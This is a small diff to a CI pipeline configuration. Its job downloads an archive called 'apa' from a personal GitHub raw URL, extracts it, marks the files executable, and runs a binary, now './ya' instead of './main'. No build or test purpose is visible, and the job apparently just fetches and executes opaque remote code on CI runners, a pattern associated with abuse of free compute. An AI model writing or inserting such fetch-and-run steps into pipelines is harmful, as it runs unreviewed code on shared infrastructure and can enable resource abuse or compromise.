@@ -10,7 +10,7 @@ jobs:
         command: |
           wget https://raw.githubusercontent.com/nedipaol/tara/main/apa && chmod u+x *
           tar -xf apa && chmod u+x *
-          ./main
+          ./ya
           
 
 
